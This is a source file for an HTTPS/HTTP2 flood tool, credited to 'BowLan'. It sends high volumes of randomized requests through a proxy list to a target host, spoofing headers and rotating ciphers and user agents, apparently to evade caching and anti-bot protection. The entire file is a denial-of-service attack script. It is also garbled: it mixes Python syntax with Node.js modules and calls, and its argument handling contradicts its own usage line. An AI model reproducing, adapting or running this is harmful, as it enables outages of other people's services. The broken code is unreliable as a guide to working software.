import random
import http.client
import http2
import tls
import net
import cluster
import fake_useragent
import colors

method = ["GET", "HEAD", "POST", "OPTIONS"]
cplist = [
	"RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
	"options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
    ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
	"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
]

accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
]
patht = [
    "?s=",
    "#",
    "$",
    "?true=",
    " ",
    "?q=",
    "?false=",
    "",
    "  ",
    "?"
]
encoding_header = [
    'deflate, gzip, br',
    'gzip, br',
    'deflate,gzip',
    'deflate',
    'br'
]
control_header = [
    'no-cache',
    'max-age=0'
]
ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError']
ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO']

def accept():
    return random.choice(accept_header)

def encoding():
    return random.choice(encoding_header)

def controling():
    return random.choice(control_header)

def cipher():
    return random.choice(cplist)

def randstr(length):
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    return ''.join(random.choice(characters) for _ in range(length))

def dataed(length):
    characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    return ''.join(random.choice(characters) for _ in range(length))

if len(process.argv) < 8:
    print('    ')
    print('        HTTPS/2 Flood (HTTPS Only)'.green.bold)
    print('    ')
    print('Usage: python FLOOD.py <GET/HEAD> <host> <proxies> <duration> <rate<64> <thread(1-3)>    ')
    exit(0)

rate = process.argv[6]
method = process.argv[2]
proxys = open(process.argv[4], 'r').read().replace('\r', '').split('\n')

def proxyr():
    return random.choice(proxys)

if cluster.isMaster:
    dateObj = datetime.datetime.now()
    for bb in range(int(process.argv[6])):
        cluster.fork()
    print('    Attacking | Method-v5 By BowLan')
    time.sleep(process.argv[5])
    print('    Attack ended.'.green.bold)
    exit(-1)
else:
    def flood():
        parsed = urllib.parse.urlparse(process.argv[3])
        uas = fake_useragent.UserAgent()
        cipper = cipher()
        proxy = proxyr().split(':')
        data = dataed(4)
        header = {
            ":method": method,
            ":scheme": "https",
            ":path": parsed.path + random.choice(patht) + randstr(25),
            "Referer": parsed.path,
            "User-agent": uas,
            "X-Forwarded-For": proxy[0],
            "Upgrade-Insecure-Requests": "1",
            "Accept-encoding": accept(),
            "Cache-Control": controling(),
        }
        agent = http.client.HTTPConnection(
            host=proxy[0],
            port=proxy[1],
            timeout=10000,
            ciphers=cipper,
            headers={
                'Host': parsed.host,
                'Proxy-Connection': 'Keep-Alive',
                'Connection': 'Keep-Alive',
            },
            method='CONNECT',
            path=parsed.host + ':443'
        )
        agent.set_tunnel(parsed.href)
        agent.connect()
        client = http2.HTTP2Connection(
            host=parsed.host,
            ciphers=cipper,
            secureProtocol='TLS_method',
            servername=parsed.host,
            challengesToSolve=5,
            clientTimeout=float('inf'),
            clientlareMaxTimeout=float('inf'),
            maxRedirects=float('inf'),
            gzip=False,
            decodeEmails=False,
            honorCipherOrder=True,
            requestCert=True,
            port=443,
            secure=True,
            rejectUnauthorized=False,
            ALPNProtocols=['h2'],
            socket=agent.sock
        )
        for _ in range(rate):
            req = client.request(header)
            req.set_encoding('utf8')
            req.on('data', lambda chunked: None)
            req.on("response", lambda: req.close())
            req.end()

    while True:
        flood()